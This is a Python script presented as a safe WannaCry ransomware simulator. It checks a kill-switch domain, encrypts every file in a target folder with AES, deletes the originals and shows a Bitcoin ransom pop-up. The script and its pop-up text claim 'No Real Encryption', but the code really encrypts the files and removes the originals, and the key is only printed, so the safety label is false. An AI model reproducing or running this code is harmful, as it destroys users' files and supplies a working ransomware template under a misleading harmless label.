import os
import random
import string
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from tkinter import messagebox, Tk

# ------------------------
# Kill-Switch Domain Check
# ------------------------
def check_kill_switch(domain="examplekillswitchdomain.com"):
    try:
        host = socket.gethostbyname(domain)
        print(f"[+] Kill-Switch Domain is Active: {domain} -> {host}")
        return True
    except socket.error:
        print(f"[-] Kill-Switch Domain is Not Active: {domain}")
        return False

# ------------------------
# AES Encryption Function (Simulation)
# ------------------------
def encrypt_file(filepath, key):
    with open(filepath, 'rb') as f:
        data = f.read()

    cipher = AES.new(key, AES.MODE_EAX)
    ciphertext, tag = cipher.encrypt_and_digest(data)

    encrypted_file = filepath + ".locked"
    with open(encrypted_file, 'wb') as f:
        f.write(cipher.nonce + tag + ciphertext)

    print(f"[+] Encrypted: {filepath} -> {encrypted_file}")
    os.remove(filepath)  # Simulate file locking by removing original

# ------------------------
# Fake File Encryption Process
# ------------------------
def simulate_encryption(target_dir="./victim_files"):
    if not os.path.isdir(target_dir):
        print(f"[-] Target directory '{target_dir}' does not exist.")
        return

    key = get_random_bytes(16)  # Random AES Key (Simulation)
    print(f"[!] AES Encryption Key (Simulated): {key.hex()}")

    for filename in os.listdir(target_dir):
        filepath = os.path.join(target_dir, filename)
        if os.path.isfile(filepath) and not filename.endswith(".locked"):
            encrypt_file(filepath, key)

# ------------------------
# Ransom Note (Fake Pop-up)
# ------------------------
def show_ransom_note():
    note = """
    Ooops, your files have been encrypted!

    What Happened to My Computer?
    Your important files are encrypted. If you want to decrypt them,
    you need to pay a ransom in Bitcoin.

    (Simulation Only — No Real Encryption)
    """
    root = Tk()
    root.withdraw()
    messagebox.showwarning("WannaCry Ransomware Simulation", note)
    root.mainloop()

# ------------------------
# Main Function
# ------------------------
def main():
    print("=== WannaCry PoC Simulator (Safe Mode) ===")

    # Step 1: Kill-Switch Domain Check
    if check_kill_switch():
        print("[!] Kill-Switch Activated. Simulation Aborted.")
        return
    else:
        print("[!] Kill-Switch Not Active. Proceeding with Simulation...")

    # Step 2: Simulate File Encryption
    simulate_encryption()

    # Step 3: Show Fake Ransom Note
    show_ransom_note()

if __name__ == "__main__":
    main()
